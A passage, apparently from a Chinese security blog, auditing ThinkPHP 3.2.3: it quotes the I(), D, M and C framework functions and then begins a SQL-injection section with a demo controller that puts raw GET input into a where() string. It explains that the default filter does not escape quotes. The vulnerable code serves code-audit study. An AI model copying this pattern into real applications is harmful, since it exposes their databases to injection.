class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;request&#x27;</span> :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$_REQUEST</span>;   </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;session&#x27;</span> :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$_SESSION</span>;   </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;cookie&#x27;</span>  :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$_COOKIE</span>;    </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;server&#x27;</span>  :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$_SERVER</span>;    </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;globals&#x27;</span> :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$GLOBALS</span>;    </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;data&#x27;</span>    :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$datas</span>;      </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;&#x27;</span>==<span class="variable">$name</span>) &#123; <span class="comment">// 获取全部变量</span></span><br><span class="line">        <span class="variable">$data</span>       =   <span class="variable">$input</span>;</span><br><span class="line">        <span class="variable">$filters</span>    =   <span class="keyword">isset</span>(<span class="variable">$filter</span>)?<span class="variable">$filter</span>:<span class="title function_ invoke__">C</span>(<span class="string">&#x27;DEFAULT_FILTER&#x27;</span>);<span class="comment">//默认情况下为 htmlspecialchars</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$filters</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$filters</span>))&#123;</span><br><span class="line">                <span class="variable">$filters</span>    =   <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$filters</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span>   =   <span class="title function_ invoke__">array_map_recursive</span>(<span class="variable">$filter</span>,<span class="variable">$data</span>); <span class="comment">// 参数过滤</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$input</span>[<span class="variable">$name</span>])) &#123; <span class="comment">// 取值操作</span></span><br><span class="line">        <span class="variable">$data</span>       =   <span class="variable">$input</span>[<span class="variable">$name</span>];</span><br><span class="line">        <span class="variable">$filters</span>    =   <span class="keyword">isset</span>(<span class="variable">$filter</span>)?<span class="variable">$filter</span>:<span class="title function_ invoke__">C</span>(<span class="string">&#x27;DEFAULT_FILTER&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$filters</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$filters</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filters</span>,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="number">1</span> !== <span class="title function_ invoke__">preg_match</span>(<span class="variable">$filters</span>,(<span class="keyword">string</span>)<span class="variable">$data</span>))&#123;</span><br><span class="line">                        <span class="comment">// 支持正则验证</span></span><br><span class="line">                        <span class="keyword">return</span>   <span class="keyword">isset</span>(<span class="variable">$default</span>) ? <span class="variable">$default</span> : <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$filters</span>    =   <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$filters</span>);                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$filters</span>))&#123;</span><br><span class="line">                <span class="variable">$filters</span>    =   <span class="keyword">array</span>(<span class="variable">$filters</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$filters</span>))&#123;</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                        <span class="variable">$data</span>   =   <span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>) ? <span class="title function_ invoke__">array_map_recursive</span>(<span class="variable">$filter</span>,<span class="variable">$data</span>) : <span class="variable">$filter</span>(<span class="variable">$data</span>); <span class="comment">// 参数过滤</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$data</span>   =   <span class="title function_ invoke__">filter_var</span>(<span class="variable">$data</span>,<span class="title function_ invoke__">is_int</span>(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : <span class="title function_ invoke__">filter_id</span>(<span class="variable">$filter</span>));</span><br><span class="line">                        <span class="keyword">if</span>(<span class="literal">false</span> === <span class="variable">$data</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span>   <span class="keyword">isset</span>(<span class="variable">$default</span>) ? <span class="variable">$default</span> : <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$type</span>))&#123;</span><br><span class="line">        	<span class="keyword">switch</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$type</span>))&#123;</span><br><span class="line">        		<span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:	<span class="comment">// 数组</span></span><br><span class="line">        			<span class="variable">$data</span> 	=	(<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        			<span class="keyword">break</span>;</span><br><span class="line">        		<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:	<span class="comment">// 数字</span></span><br><span class="line">        			<span class="variable">$data</span> 	=	(<span class="keyword">int</span>)<span class="variable">$data</span>;</span><br><span class="line">        			<span class="keyword">break</span>;</span><br><span class="line">        		<span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:	<span class="comment">// 浮点</span></span><br><span class="line">        			<span class="variable">$data</span> 	=	(<span class="keyword">float</span>)<span class="variable">$data</span>;</span><br><span class="line">        			<span class="keyword">break</span>;</span><br><span class="line">        		<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:	<span class="comment">// 布尔</span></span><br><span class="line">        			<span class="variable">$data</span> 	=	(<span class="keyword">boolean</span>)<span class="variable">$data</span>;</span><br><span class="line">        			<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:   <span class="comment">// 字符串</span></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$data</span>   =   (<span class="keyword">string</span>)<span class="variable">$data</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 变量默认值</span></span><br><span class="line">        <span class="variable">$data</span>       =    <span class="keyword">isset</span>(<span class="variable">$default</span>)?<span class="variable">$default</span>:<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>) &amp;&amp; <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>,<span class="string">&#x27;think_filter&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他快捷方法"><a href="#其他快捷方法" class="headerlink" title="其他快捷方法"></a>其他快捷方法</h2><p><code>ThinkPHP/Common/functions.php</code></p>
<p><code>D</code>方法用于实例化模型类</p>
<p><code>M</code>方法用于实例化没有模型文件的Model</p>
<p><code>C</code>方法用于读取配置</p>
<p>在<code>Application/Home/Model/UserModel.class.php</code>中写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;asdf&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>Application/Home/Controller/IndexController.class.php</code>中写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span>=<span class="keyword">new</span> <span class="title class_">\Home\Model\UserModel</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$User</span>-&gt;a);</span><br><span class="line">        <span class="variable">$User</span>=<span class="title function_ invoke__">D</span>(<span class="string">&#x27;User&#x27;</span>);<span class="comment">//等价于 $User=new \Home\Model\UserModel();</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$User</span>-&gt;a);</span><br><span class="line">        <span class="variable">$User</span>=<span class="title function_ invoke__">M</span>(<span class="string">&#x27;User&#x27;</span>);<span class="comment">//等价于 $User=new \Think\Model(&#x27;User&#x27;);</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$User</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152045285.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152114255.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\phpstudy_pro\WWW\thinkphp_3.<span class="number">2.3</span>\Application\Home\Controller\IndexController.<span class="keyword">class</span>.php:<span class="number">7</span>:<span class="keyword">string</span> <span class="string">&#x27;asdf&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">C:\phpstudy_pro\WWW\thinkphp_3.<span class="number">2.3</span>\Application\Home\Controller\IndexController.<span class="keyword">class</span>.php:<span class="number">9</span>:<span class="keyword">string</span> <span class="string">&#x27;asdf&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">C:\phpstudy_pro\WWW\thinkphp_3.<span class="number">2.3</span>\Application\Home\Controller\IndexController.<span class="keyword">class</span>.php:<span class="number">11</span>:<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实例化模型类 格式 [资源://][模块/]模型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 资源地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $layer 模型层名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Think\Model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">D</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$layer</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Think\Model</span>;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_model</span>  =   <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$layer</span>          =   <span class="variable">$layer</span>? : <span class="title function_ invoke__">C</span>(<span class="string">&#x27;DEFAULT_M_LAYER&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_model</span>[<span class="variable">$name</span>.<span class="variable">$layer</span>]))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_model</span>[<span class="variable">$name</span>.<span class="variable">$layer</span>];</span><br><span class="line">    <span class="variable">$class</span>          =   <span class="title function_ invoke__">parse_res_name</span>(<span class="variable">$name</span>,<span class="variable">$layer</span>);<span class="comment">//导入类库</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$class</span>)) &#123;</span><br><span class="line">        <span class="variable">$model</span>      =   <span class="keyword">new</span> <span class="variable">$class</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$name</span>));</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// 自动加载公共模块下面的模型</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">C</span>(<span class="string">&#x27;APP_USE_NAMESPACE&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">import</span>(<span class="string">&#x27;Common/&#x27;</span>.<span class="variable">$layer</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$class</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$class</span>      =   <span class="string">&#x27;\\Common\\&#x27;</span>.<span class="variable">$layer</span>.<span class="string">&#x27;\\&#x27;</span>.<span class="variable">$name</span>.<span class="variable">$layer</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$model</span>      =   <span class="title function_ invoke__">class_exists</span>(<span class="variable">$class</span>)? <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$name</span>) : <span class="keyword">new</span> <span class="title class_">Think\Model</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Think\Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;D方法实例化没找到模型类&#x27;</span>.<span class="variable">$class</span>,<span class="title class_">Think\Log</span>::<span class="variable constant_">NOTICE</span>);</span><br><span class="line">        <span class="variable">$model</span>      =   <span class="keyword">new</span> <span class="title class_">Think\Model</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$name</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_model</span>[<span class="variable">$name</span>.<span class="variable">$layer</span>]  =  <span class="variable">$model</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$model</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实例化一个没有模型文件的Model</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name Model名称 支持指定基础模型 例如 MongoModel:User</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $tablePrefix 表前缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $connection 数据库连接信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Think\Model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$tablePrefix</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$connection</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_model</span>  = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>,<span class="string">&#x27;:&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$class</span>,<span class="variable">$name</span>)    =  <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>,<span class="variable">$name</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$class</span>      =   <span class="string">&#x27;Think\\Model&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$guid</span>           =   (<span class="title function_ invoke__">is_array</span>(<span class="variable">$connection</span>)?<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$connection</span>):<span class="variable">$connection</span>).<span class="variable">$tablePrefix</span> . <span class="variable">$name</span> . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_model</span>[<span class="variable">$guid</span>]))</span><br><span class="line">        <span class="variable">$_model</span>[<span class="variable">$guid</span>] = <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$name</span>,<span class="variable">$tablePrefix</span>,<span class="variable">$connection</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_model</span>[<span class="variable">$guid</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取和设置配置参数 支持批量定义</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $name 配置变量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value 配置值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $default 默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"><span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$value</span>=<span class="literal">null</span>,<span class="variable">$default</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_config</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 无参数时获取所有</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 优先执行设置获取或赋值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>] : <span class="variable">$default</span>;</span><br><span class="line">            <span class="variable">$_config</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 二维数组设置和获取支持</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span>[<span class="number">0</span>]   =  <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] : <span class="variable">$default</span>;</span><br><span class="line">        <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 批量设置</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line">        <span class="variable">$_config</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$_config</span>, <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$name</span>,CASE_UPPER));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 避免非法参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例化一个空模型类即可进行sql查询</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$m</span> = <span class="title function_ invoke__">M</span>();<span class="comment">//$m = new Model();</span></span><br><span class="line">        <span class="variable">$m</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select user();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152126210.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152126014.png"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="双引号包裹导致变量被直接解析"><a href="#双引号包裹导致变量被直接解析" class="headerlink" title="双引号包裹导致变量被直接解析"></a>双引号包裹导致变量被直接解析</h3><blockquote>
<p>严格来说,这个漏洞产生的原因在于开发者没有正确地使用框架</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;id,username,password&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下<code>I</code>方法只会对参数进行<code>htmlspecialchars</code>即html编码,不会进行如<code>addslashes</code>等操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171414284.png"></p>
<p>而在<code>Model.class.php</code>的<code>where</code>方法中,在<code>parse</code>没有设置的情况下,不会进行<code>escapeString</code>操作</p>
